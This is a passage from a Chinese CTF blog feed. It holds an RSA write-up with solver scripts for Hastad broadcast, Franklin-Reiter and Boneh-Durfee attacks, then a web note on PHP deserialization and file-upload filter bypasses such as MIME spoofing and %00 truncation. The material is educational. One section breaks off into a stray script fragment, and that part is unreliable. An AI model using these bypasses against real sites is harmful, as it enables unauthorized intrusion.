class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">        results = solve_mod([e*d0*X == k*n*X + k*X + X-k*X**<span class="number">2</span> - k*n], <span class="number">2</span>^d0.nbits())</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> results:</span><br><span class="line">            p0 = ZZ(x[<span class="number">0</span>])</span><br><span class="line">            p = recover_p(p0, n)</span><br><span class="line">            <span class="keyword">if</span> p <span class="keyword">and</span> p != <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n =</span><br><span class="line">e = </span><br><span class="line">c =</span><br><span class="line">d0 =</span><br><span class="line">p = int(find_p0(d0, e, n))</span><br><span class="line">print(<span class="string">"found p: "</span>, p)</span><br><span class="line">q = n//int(p)</span><br><span class="line">print(<span class="string">"found d: "</span>, inverse_mod(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>)))</span><br></pre></td></tr></table></figure><h3 id="第四关：Hastad’s-Broadcast-Attack"><a href="#第四关：Hastad’s-Broadcast-Attack" class="headerlink" title="第四关：Hastad’s Broadcast Attack"></a>第四关：Hastad’s Broadcast Attack</h3><p>已知n1,c1,n2,c2,n3,c3,e=3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[+]Generating challenge <span class="number">4</span></span><br><span class="line">[+]e=<span class="number">3</span></span><br><span class="line">[+]m=random.getrandbits(<span class="number">512</span>)</span><br><span class="line">[+]n1=<span class="number">0x1819da5abb8b8158ad6c834cb8fd6bc3ed9a3bd3e33b976344173f1766bf909bda253f18c9d9640570152707e493e3d3d461becc7197367ab702af33d67805e938321915f439e33f616b41781c54c101f05db0760cc8ca0f09063f3142b5b31f6aa062f1e60bba1a45e3720ab462ebd31e1228f5c49ae3de8172bad77b2d5b57L</span></span><br><span class="line">[+]c1=pow(m,e,n1)=<span class="number">0x7841e1b22f4d571b722807007dc1d550a1970a32801c4649e83f4b99a01f70815b3952a34eadc1ec8ba112be840e81822f1c464b1bb4b24b168e5cb38016469548c5afd8c1bdb55402d1208f3201a2a4098aef305a8380b8c5b6b5b17d9fb65a6bdfdcf21abc063924a6512f18f1dc22332dfc87f4a00925daf1988d43aaecdL</span></span><br><span class="line">[+]n2=<span class="number">0x6d1164ffa8cb2b7818b5ac90ef121b94e38fd5f93636b212184717779c45581f13c596631b23781de82417f9c8126be4a04ab52a508397f9318c713e65d08961d172f24f877f48ef9e468e52e3b5b17cbbe81646903d650f703c51f2ad0928dd958700b939e1fd7f590f26a6d637bd9ef265d027e7364c4e5e40a172ce970021L</span></span><br><span class="line">[+]c2=pow(m,e,n2)=<span class="number">0x58f26614932924c81d30ef2389d00cf2115652ced08d59e51619207a7836fd3908b3179fc0df03fe610059c1fe001ca421e01e96afc47147d77bbbe6a3f51c5c06f1baeab8dc245c2567a603f87dea0a053b8f5df4e68f28896d7d1ba3dd3dcd7c4652d59404fa237f4868e1bbc9ae529196739486d86bd1723a78dfac781fe5L</span></span><br><span class="line">[+]n3=<span class="number">0xde53be1db600264b0c3511ae4939c82164ea1166aadfd8dd0af6e15eb9df79a5d1a2757d3d15630441790ecf834098a1cf4b5858003f0b7f3a72823de014ac0a7c827ed1ca4185b245774f442a05dee3fe6bf846e5b035caf3b3c574b88911b7e5b81fc2c638729240f949e09a25a3a4a762c31005684791577d5e9fc8221abdL</span></span><br><span class="line">[+]c3=pow(m,e,n3)=<span class="number">0x89f9fabc7e8d6f0e92d31109ea4c024446b323d9f441d72db4eb296eba3011abe2a58e68ec21a663e6493981e21835a826f28d1bc28d3476273ff733ef69c152e7fbfebc826132266f6eb65c86b242417c06eb31453f99ed7e075ababbfc208d042a2436a766f24eb9af0f45b60eea2c4405edfabd87584806bc0a1a51f9ca7aL</span></span><br><span class="line">[-]long_to_bytes(m).encode(<span class="string">'hex'</span>)=</span><br></pre></td></tr></table></figure><p>对于这一关，由于我们知道$m$是512bit的，而用于加密的$e$等于3，因此三个$c$即为$m^3$ 在不同模下的剩余。由于$m^3为512 * 3=1536bit$，而可以知道的是三个模n的bit长度分别为1021，1023，1024。所以利用中国剩余定理【具体原理可以看俺这一篇<a href="https://www.anquanke.com/post/id/194137" target="_blank" rel="noopener">文章</a>】我们是可以还原长度为$1536bit$的$m^3$的，最后我们再开个三次根就好得到$m$了。</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> (reduce(gcd,mi)==<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    M = reduce(<span class="keyword">lambda</span> x, y: x * y, mi)</span><br><span class="line">    ai_ti_Mi = [a * (M / m) * invert(M / m, m) <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi, ai)]</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x + y, ai_ti_Mi) % M</span><br><span class="line">    </span><br><span class="line"><span class="keyword">print</span> iroot(CRT([n1,n2,n3],[c1,c2,c3]),<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>但既然这里讲的是coppersmith‘s method，那么我们再来看看如何用coppersmith‘s method来解决这道低指数广播攻击的问题。</p><p>我们再看到这个问题，我们有三条式子，分别是</p><p>$m^3\equiv c_1 \pmod{n_1}$</p><p>$m^3\equiv c_2 \pmod{n_2}$</p><p>$m^3\equiv c_3 \pmod{n_3}$</p><p>然后前面的方法是我们用了一个CRT，求得到了一个C 满足$m^3 \equiv C \pmod{N}$，其中$N=\prod_{i=0}^{3}n_i $，而由于N过大，导致这个同余式等同于等式，因此我们才可以直接对C开三次根，求得m。</p><p>而用coppersmith‘s method来解决这道问题，我们可以将问题推广到更一般的情况，就是加密的不再是相同的m，而是具有线性关系的$m_i$，比如：$e = 3,m_i = m，m+1，2m+2 $我们就有三条式子</p><p>$m^3\equiv c_1 \pmod{n_1} =&gt; f(m)=m^3-c_1\equiv 0 \pmod{n_1}$</p><p>$(m+1)^3\equiv c_2 \pmod{n_2} =&gt; f(m)=(m+1)^3-c_2\equiv 0 \pmod{n_2}$</p><p>$(2m+2)^3\equiv c_3 \pmod{n_3} =&gt; f(m)=(2m+2)^3-c_3\equiv 0 \pmod{n_3}$</p><p>同样，由于这里的$n_i$彼此互素，因此利用CRT我们最终也能得到一个式子$f(x) \equiv 0 \pmod{N}$</p><p>m显然会是这个式子的解，而又由于$m&lt;N^{\frac{1}{3}}$，因此利用coppersmith‘s method我们可以求解得m。</p><p>exp来自<a href="https://ycdxsb.cn/2decc525.html" target="_blank" rel="noopener">食兔人的博客——CTF中的RSA基本套路</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Cs = []</span><br><span class="line">Ns =  []</span><br><span class="line">A=  [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">B= [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">e= <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># solve</span></span><br><span class="line">cnt = e</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(ZZ)</span><br><span class="line">x = PR.gen()</span><br><span class="line">Fs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(cnt):</span><br><span class="line">    f =  (A[i]*x + B[i])**e - Cs[i]</span><br><span class="line">    ff = f.change_ring(Zmod(Ns[i]))</span><br><span class="line">    ff = ff.monic()</span><br><span class="line">    f = ff.change_ring(ZZ)</span><br><span class="line">    Fs.append(f)</span><br><span class="line"></span><br><span class="line">F = crt(Fs, Ns)</span><br><span class="line">M = reduce( <span class="keyword">lambda</span> x, y: x * y, Ns )</span><br><span class="line">FF = F.change_ring(Zmod(M))</span><br><span class="line">m = FF.small_roots(epsilon=<span class="number">0.05</span>)</span><br><span class="line">print(<span class="string">"m: "</span>,m)</span><br></pre></td></tr></table></figure><h3 id="第五关：Related-Message-Attack"><a href="#第五关：Related-Message-Attack" class="headerlink" title="第五关：Related Message Attack"></a>第五关：Related Message Attack</h3><p>已知n,e=3，m对应的密文c1，(m+1)对应的密文c2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[+]Generating challenge <span class="number">5</span></span><br><span class="line">[+]n=<span class="number">0xf2e5339236455e2bc1b1bd12e45b9341a3b223ddb02dec11c880fa4aa8835df9e463e4c446292cd5a2fe19b10017856654b6d6c3f3a94a95807712329f7dae2e1e6506094d5d2f9c8a05c35cbf3366330996db9bff930fe566016d5e850e232057d419292ce30df9c135d56ef1bb72c38838d4b127aa577ceb4aba94d4e0d55L</span></span><br><span class="line">[+]e=<span class="number">3</span></span><br><span class="line">[+]m=random.getrandbits(<span class="number">512</span>)</span><br><span class="line">[+]c=pow(m,e,n)=<span class="number">0x7175f2614b8d1a27b43f7c3873b3422658af28291ddc88b15f97f499e00cd4c5c4fd980f062376a61e5dd4c15d52d73262d3c066f1e8f46a04af6fead7c3960d2768a0d214bbc3e05d2f6e56aee158071574e55753624a19e094590fc3f9918a2065cd5ff7693e0d34517bc0072e6c9e444e66c4ece88d657f99e44bee48924L</span></span><br><span class="line">[+]x=pow(m+<span class="number">1</span>,e,n)=<span class="number">0xd5f4af36b5391bd731cfa4313466024ab1bc3b455024a5d8b218faba0e956252f01c4d01bd36765035c33d73e5af7f178aeb2606edf86814d74082c64828fa4c1666b69d05fab69dd1ef47b243356290fdb74e001f54edec70681cf52319c73bce9acda4803a9e97597ca21d60072c2d2b516f161bec1f6a91baa2e24c7655bL</span></span><br><span class="line">[-]long_to_bytes(m).encode(<span class="string">'hex'</span>)=</span><br></pre></td></tr></table></figure><p>同第四关一样，这一题也有多解，一种是像一叶飘零师傅<a href="https://www.anquanke.com/post/id/158944" target="_blank" rel="noopener">这篇文章</a>所述，直接硬化公式</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getM2</span><span class="params">(a,b,c1,c2,n)</span>:</span></span><br><span class="line">    a3 = pow(a,<span class="number">3</span>,n)</span><br><span class="line">    b3 = pow(b,<span class="number">3</span>,n)</span><br><span class="line">    first = c1-a3*c2+<span class="number">2</span>*b3</span><br><span class="line">    first = first % n</span><br><span class="line">    second = <span class="number">3</span>*b*(a3*c2-b3)</span><br><span class="line">    second = second % n</span><br><span class="line">    third = second*gmpy.invert(first,n)</span><br><span class="line">    third = third % n</span><br><span class="line">    fourth = (third+b)*gmpy.invert(a,n)</span><br><span class="line">    <span class="keyword">return</span> fourth % n</span><br><span class="line"></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="number">-1</span></span><br><span class="line">c1 =</span><br><span class="line">c2 =</span><br><span class="line">n =</span><br><span class="line">m = a*getM2(a,b,c1,c2,n) + b</span><br><span class="line"><span class="keyword">print</span> hex(m)</span><br></pre></td></tr></table></figure><p>另一种是求多项式下的GCD，</p><p>首先这一题我们可以将已知的信息转换一下，我们设$M_1 = m$，$M_2 = m+1$；再变换一下，设$M_1=x$，那么$M_2 = ax+b $ 【$a=b=1$】</p><p>如果我们有映射关系$f(x)=ax+b$，那么就有$M_2 = f(M_1)$，因此题面</p><p>$m^3-c_1 \equiv 0 \pmod n$</p><p>$(m+1)^3-c_2 \equiv 0 \pmod n$</p><p>可以变成求解一个方程组</p><p> $X^3-c_1 \equiv 0 \pmod n$     ①</p><p>$f(X)^3-c_2 \equiv 0 \pmod n$     ②</p><p>显然对于这两个多项式有一个公共解：$M_1$，因此两条式子都可以化成</p><p>$(X - M_1) * K_1 \equiv 0 \pmod n$</p><p>$(X-M_1) * K_2 \equiv 0 \pmod n$ 【$K_i$代表未知的多项式】</p><p>再由①、②式的单调性可知，①、②式在实数域下仅由唯一解，因此$K_1、K_2$式均不可再因式分解，因此其彼此互素</p><p>从而我们对这两个多项式求一个GCD就可以得到$（X-M_1）$,但由于在模$n$下，得到的将是$X+M’$的形式 【$M’ \equiv -M_1 \pmod n$】，所以最终$M = -M’ \pmod n$</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">franklinReiter</span><span class="params">(n,e,b,c1,c2)</span>:</span></span><br><span class="line">    R.&lt;X&gt; = Zmod(n)[]</span><br><span class="line">    f1 = X^e - c1</span><br><span class="line">    f2 = (X + b)^e - c2</span><br><span class="line">    m_ = GCD(f1,f2).coefficients()[<span class="number">0</span>] <span class="comment"># 返回的是首一多项式，coefficients()返回多项式各项式的系数，项式次数递增，所以第0项是常数 </span></span><br><span class="line">    <span class="keyword">return</span> Integer(n - m_) <span class="comment"># 由于tmp其实是 -m % n,所以这里给他转换回去。</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCD</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> a.monic()<span class="comment"># 返回首一多项式，即多项式最高次的项式系数为1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> GCD(b, a % b)</span><br><span class="line">e = </span><br><span class="line">n = </span><br><span class="line">b = </span><br><span class="line">c1 = </span><br><span class="line">c2 = </span><br><span class="line">M = franklinReiter(n,e,b,c1,c2)</span><br><span class="line">print(M)</span><br></pre></td></tr></table></figure><h3 id="第六关：Boneh-Durfee-Attack"><a href="#第六关：Boneh-Durfee-Attack" class="headerlink" title="第六关：Boneh Durfee Attack"></a>第六关：Boneh Durfee Attack</h3><p>已知n,e,c，d只有1024  *  0.27bit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[+]Generating challenge <span class="number">6</span></span><br><span class="line">[+]n=<span class="number">0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27L</span></span><br><span class="line">[+]d=random.getrandbits(<span class="number">1024</span>*<span class="number">0.270</span>)</span><br><span class="line">[+]e=invmod(d,phin)</span><br><span class="line">[+]hex(e)=<span class="number">0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bbL</span></span><br><span class="line">[+]m=random.getrandbits(<span class="number">512</span>)</span><br><span class="line">[+]c=pow(m,e,n)=<span class="number">0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866cL</span></span><br><span class="line">[-]long_to_bytes(m).encode(<span class="string">'hex'</span>)=</span><br></pre></td></tr></table></figure><p>继续来推式子：</p><p>$∵ed=k\phi(n)+1$</p><p>$∴k\phi(n)+1\equiv 0 \pmod{e}$</p><p>$∴k(N+1-p-q)+1\equiv 0 \pmod{e}$</p><p>$∴2k(\frac{N+1}{2}+\frac{-p-q}{2})+1\equiv 0 \pmod{e}$</p><p>设$A=\frac{N+1}{2}，y=\frac{-p-q}{2}),x=2k$，可得式子：$f(k,y)=1+x * (A+y)$</p><p>如果我们能在模$e$下解得该方程的根$x,y$，由$ed=1+x * (A+y)$就可以得到$d$了。</p><p>但具体怎么去求解这个方程呢？这就涉及多元coppersmith’s method了，超纲了吖，所以这里先用了github上的一个脚本<a href="https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage" target="_blank" rel="noopener">boneh_durfee.sage</a>。这里的适用条件是$d&lt;N^{0.292}$</p><h1 id="思考-amp-总结"><a href="#思考-amp-总结" class="headerlink" title="思考&amp;总结"></a>思考&amp;总结</h1><p>​        在coppersmith’s method的边界计算中，由于推理中存在的不等式，格基规约算法在不同情况有不同的表现等问题，导致coppersmith’s method的边界其实比较模糊，而构造不同的格也会计算出不同的边界值，有不同的效果。所以，在考虑时间和空间复杂度的情况下，是否会存在某种最优的构造方法呢？</p><p>​        好了，这里大概是大部分的对单元coppersmith’s method的应用实例了。最后一手Boneh Durfee Attack利用了多元coppersmith‘s method，这算是埋了一手伏笔么？</p>]]></content>
      
      
      <categories>
          
          <category> 密码小屋 </category>
          
          <category> Rsa </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Coppersmith’s Method </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web学习笔记 之 文件与序列化</title>
      <link href="/2020/08/09/Web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8E%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2020/08/09/Web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8E%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="文件与序列化"><a href="#文件与序列化" class="headerlink" title="文件与序列化"></a>文件与序列化</h1><p>&emsp;&emsp;这一章的标题是文件与序列化，因为反序列化的利用总是要用到unserialize()这个函数。而在实际场景中这个函数也许并不常见，但是如果有文件上传点的话，兴许是可以利用phar伪协议的。所以我想连着文件上传、文件包含一起整理下。</p><h2 id="序列化-amp-反序列化"><a href="#序列化-amp-反序列化" class="headerlink" title="序列化&amp;反序列化"></a>序列化&amp;反序列化</h2><p>&emsp;&emsp;在开发过程中，如果遇到需要将数据存储，并且要保持他原来的类型就需要用到序列化。比如将一个对象序列化，顾名思义就是将这个对象以序列化的形式存储，方便下次使用的时候恢复。举个栗子就是，你想将变量$a = 1存起来，下次好直接用。如果你只是把他以字符串的形式存进了文件：“$a = 1”，那么下次读取文件的时候你也只能读到一串普通的字符串，也不是一个被赋值了的变量。</p><p>序列化、反序列化用到的函数就是serialize和unserialize</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">'a'</span> =&gt; <span class="string">'Apple'</span> ,<span class="string">'b'</span> =&gt; <span class="string">'banana'</span> , <span class="string">'c'</span> =&gt; <span class="string">'Coconut'</span>);</span><br><span class="line">  </span><br><span class="line"><span class="comment">//序列化数组</span></span><br><span class="line">$s = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $s;</span><br><span class="line"><span class="comment">//输出结果：a:3:&#123;s:1:"a";s:5:"Apple";s:1:"b";s:6:"banana";s:1:"c";s:7:"Coconut";&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;&lt;br /&gt;'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line">$o = unserialize($s);</span><br><span class="line">print_r($o);</span><br><span class="line"><span class="comment">//输出结果 Array ( [a] =&gt; Apple [b] =&gt; banana [c] =&gt; Coconut )</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;对于序列化的规则，比如<code>a:3:{s:1:&quot;a&quot;;s:5:&quot;Apple&quot;;s:1:&quot;b&quot;;s:6:&quot;banana&quot;;s:1:&quot;c&quot;;s:7:&quot;Coconut&quot;;}</code>这条序列化中字符的具体含义：a就代表这是一个数组（array），3代表这个数组里有三个元素，用分号隔开；每个元素分为两个部分：key、value。这里的s代表这里的key一个字符串，1代表这个key的长度，“a”就是key的值。紧接着的s代表这里的value是一个字符串，5代表这个value的长度，“Apple”就是value的值。如果这个数组不是键值对的形式话，那么序列化串则会将元素的下标作为key，int类型。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">'a'</span> , <span class="string">'Apple'</span>, <span class="string">'b'</span> , <span class="string">'banana'</span>, <span class="string">'c'</span> , <span class="string">'Coconut'</span>);</span><br><span class="line"><span class="comment">//序列化数组</span></span><br><span class="line">$s = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $s;</span><br><span class="line"><span class="comment">//输出结果：a:6:&#123;i:0;s:1:"a";i:1;s:5:"Apple";i:2;s:1:"b";i:3;s:6:"banana";i:4;s:1:"c";i:5;s:7:"Coconut";&#125;</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;除了数组可以序列化，对象啥的也可以，O代表的是对象，对象中的属性的类型在序列化中也有会特殊的标识，但有些是不可打印字符，可以用base64编码来解决这个问题。</p><p>&emsp;&emsp;在CTF解题过程中，利用点一般是出现在反序列化上。比如，我们之前提到字符串的序列化串会有专门一个表示字符串长度的值，这个值决定着反序列化时读取的字符串的长度【试想如果这个值比实际的值大了，或者小了，会产生啥问题呢？】。然后就是在对象的序列化时，php中魔术方法的存在了。</p><p>推荐一下先知这篇文章：<a href="https://xz.aliyun.com/t/8082#toc-2" target="_blank" rel="noopener">怎样挖掘出属于自己的php反序列化链</a></p><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">__wakeup</span>() <span class="comment">//使用unserialize时触发</span></span><br><span class="line"><span class="selector-tag">__sleep</span>() <span class="comment">//使用serialize时触发</span></span><br><span class="line"><span class="selector-tag">__destruct</span>() <span class="comment">//对象被销毁时触发</span></span><br><span class="line"><span class="selector-tag">__call</span>() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="selector-tag">__callStatic</span>() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="selector-tag">__get</span>() <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line"><span class="selector-tag">__set</span>() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="selector-tag">__isset</span>() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="selector-tag">__unset</span>() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="selector-tag">__toString</span>() <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="selector-tag">__invoke</span>() <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span>   </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>   </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">return</span> <span class="string">'__toString&lt;br /&gt;'</span>;   </span><br><span class="line">    &#125;   </span><br><span class="line">&#125;   </span><br><span class="line"><span class="comment">// 创建一个对象   </span></span><br><span class="line">$object = <span class="keyword">new</span> TestClass(); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象被当作一个字符串   </span></span><br><span class="line"><span class="comment">//  __toString会被调用  </span></span><br><span class="line"><span class="keyword">echo</span> $object;   </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">输出效果如下：</span><br><span class="line">__toString</span><br></pre></td></tr></table></figure><h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       <span class="meta">?&gt;</span><span class="string">")&#125;</span></span><br><span class="line"><span class="string">r1 = r.post(url, files=file1)</span></span><br><span class="line"><span class="string">print(r1.text)</span></span><br></pre></td></tr></table></figure><p>但如果服务端没有对上传的文件进行过滤的话，或者过滤的不够完善，则容易被攻击者趁虚而入。下面就讲一下文件后缀的绕过</p><h3 id="客户端绕过"><a href="#客户端绕过" class="headerlink" title="客户端绕过"></a>客户端绕过</h3><p>&emsp;&emsp;浏览器禁用JavaScript；或者抓包修改后缀就可以了。</p><h3 id="服务器端MIME绕过"><a href="#服务器端MIME绕过" class="headerlink" title="服务器端MIME绕过"></a>服务器端MIME绕过</h3><p>同样抓包修改数据包的content-type字段就可。</p><p>常见的图片格式的MIME类型有以下 几种类型：</p><p>PNG图像：image/png </p><p>GIF图形： image/gif </p><p>JPG图形：image/jpeg</p><h3 id="服务器端扩展名检测绕过"><a href="#服务器端扩展名检测绕过" class="headerlink" title="服务器端扩展名检测绕过"></a>服务器端扩展名检测绕过</h3><h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><ol><li><p>文件名大小写绕过：pHp，AsP</p></li><li><p>特殊文件名绕过</p><p>&emsp;&emsp;在Windows下有一个特性就是如果文件后缀以点‘.’或者空格‘ ’结尾的后缀 名时，系统在保存文件时会自动去除点和空格。但要注意 Unix/Linux 系统没有 这个特性。因为有些服务器端的后缀名检测是取文件名最后一个.后面的字符串，拿这个字符串与黑名单列表对比</p></li><li><p>0x00截断绕过</p><p>&emsp;&emsp;名后缀有一个%00字节，可以截断某些函数对文件名的判断。在许多语言函 